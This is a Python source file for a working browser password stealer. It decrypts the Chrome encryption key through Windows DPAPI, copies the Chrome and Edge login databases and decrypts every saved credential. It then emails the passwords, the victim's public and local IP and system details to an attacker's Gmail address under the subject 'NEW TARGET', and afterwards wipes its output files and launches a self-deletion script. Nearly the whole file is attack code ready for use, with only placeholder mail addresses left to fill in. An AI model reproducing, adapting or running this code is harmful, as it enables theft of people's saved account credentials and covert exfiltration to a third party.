import os
import json
import base64
import sqlite3
import os.path
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

f = open('passwords-chrome.txt', 'a')
g = open('passwords-edge.txt', 'a')


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    # Local_computer_directory_path will look
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def main2():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Microsoft", "Edge", "User Data", "default", "Login Data")  # "AppData", "Local",
    # "Google", "Chrome", "User Data", "default", "Login Data"
    filename = "EdgePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]  # 0
        login_page_url = row[1]  # 1
        user_name = row[2]  # 2
        decrypted_password = password_decryption(row[3], key)  # 3
        date_of_creation = row[4]  # 4
        last_usage = row[5]  # 5

        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"Username: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")
            #  print("written to passwords-edge.txt")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
        if last_usage != 86400000000 and last_usage:
            print(f"Last Used: {str(chrome_date_and_time(last_usage))}")
        print("=" * 100)
        #   print("Data written to passwords-edge.txt")
        with open('passwords-edge.txt', 'a') as g:
            g.write(
                f"Main URL: {main_url}\rLogin URL: {login_page_url}\rUsername: {user_name}\rDecrypted Password: {decrypted_password}\rCreation date: {str(chrome_date_and_time(date_of_creation))}\rLast Used: {str(chrome_date_and_time(last_usage))}\r" + "=" * 100 + "\r")
            g.close()
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")  # "AppData", "Local",
    # "Microsoft", "Edge", "User Data", "default", "Login Data"
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]  # 0
        login_page_url = row[1]  # 1
        user_name = row[2]  # 2
        decrypted_password = password_decryption(row[3], key)  # 3
        date_of_creation = row[4]  # 4
        last_usage: object = row[5]  # 5

        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"Username: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")
            #  print("written to passwords-chrome.txt")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
        if last_usage != 86400000000 and last_usage:
            print(f"Last Used: {str(chrome_date_and_time(last_usage))}")
        print("=" * 100)
        #  print("Data written to passwords-chrome.txt")
        with open('passwords-chrome.txt', 'a') as f:
            f.write(
                f"Main URL: {main_url}\rLogin URL: {login_page_url}\rUsername: {user_name}\rDecrypted Password: {decrypted_password}\rCreation date: {str(chrome_date_and_time(date_of_creation))}\rLast Used: {str(chrome_date_and_time(last_usage))}\r" + "=" * 100 + "\r")
            f.close()
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass
    main2()

    from email.mime.application import MIMEApplication
    import smtplib, ssl
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import platform
    import socket
    from datetime import datetime
    from requests import get

    ip = get('https://api.ipify.org').text

    now = datetime.now()

    # Month in letters
    if now.strftime("%m") == "01":
        month = "January"
    if now.strftime("%m") == "02":
        month = "February"
    if now.strftime("%m") == "03":
        month = "March"
    if now.strftime("%m") == "04":
        month = "April"
    if now.strftime("%m") == "05":
        month = "May"
    if now.strftime("%m") == "06":
        month = "Jun"
    if now.strftime("%m") == "07":
        month = "July"
    if now.strftime("%m") == "08":
        month = "August"
    if now.strftime("%m") == "09":
        month = "September"
    if now.strftime("%m") == "10":
        month = "October"
    if now.strftime("%m") == "11":
        month = "November"
    if now.strftime("%m") == "12":
        month = "December"

    dt = now.strftime(f"%H:%M:%S<br>{month} %d, %Y")

    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    # Replace with your own gmail account
    gmail = 'SENDER@gmail.com'  # Enter here your email
    password = 'SENDER_PASSWORD'  # Enter here your password

    message = MIMEMultipart('mixed')
    message['From'] = 'PyPass <{sender}>'.format(sender=gmail)
    message['To'] = 'RECEIVER@gmail.com'  # Enter here the receiver Mail
    message['CC'] = 'ANOTHER-RECEIVER@gmail.com'  # Enter here another receiver Mail
    message['Subject'] = f'NEW TARGET {ip}, {socket.gethostbyname(socket.gethostname())}'

    msg_content = f"<h3><b><em>Connected at {dt}</em></b><br><br><b><u>Computer Data</u></b><br> Machine: {platform.machine()}<br> Version: {platform.version()}<br> Uname: {platform.uname()}<br> OS system: {platform.system()}<br> Processor: {platform.processor()}<br><br> <b><u>IPs</u></b><br> Public IP: {ip}<br> Local IP: {socket.gethostbyname(socket.gethostname())}<br><br> <b><u>Google Chrome & Microsoft Edge Passwords</u></b><br> See attach.<br><br><br><b><p style=\"color: red\">NOTE: Edge-Passwords are in work<p></b></h3><br><br><p><a style=\"color: lightblue\" href=\"https://patrikmartic.tk\">Developed by Patrik</a></p>"

    body = MIMEText(msg_content, 'html')
    message.attach(body)

    files = "passwords-chrome.txt", "passwords-edge.txt"
    try:
        for f in files:  # add files to the message
            file_path = os.path.join(f)
            attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename=f)
            message.attach(attachment)
    except Exception as e:
        print(str(e))

    msg_full = message.as_string()

    context = ssl.create_default_context()

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(gmail, password)
        server.sendmail(gmail,
                        message['To'].split(";") + (message['CC'].split(";") if message['CC'] else []),
                        msg_full)
        server.quit()

    print(f"email sent out successfully to {message['To']} {message['CC']}")
    # Delete all text in a text file
    f = open("passwords-chrome.txt", "r+")
    f.truncate(0)
    f.close()
    # Delete all text in a text file
    g = open("passwords-chrome.txt", "r+")
    g.truncate(0)
    g.close()
    if os.path.isfile("delete.pyw"):
        os.startfile("delete.pyw")
    if os.path.isfile("delete.exe"):
        os.startfile("delete.exe")


if __name__ == '__main__':
    main()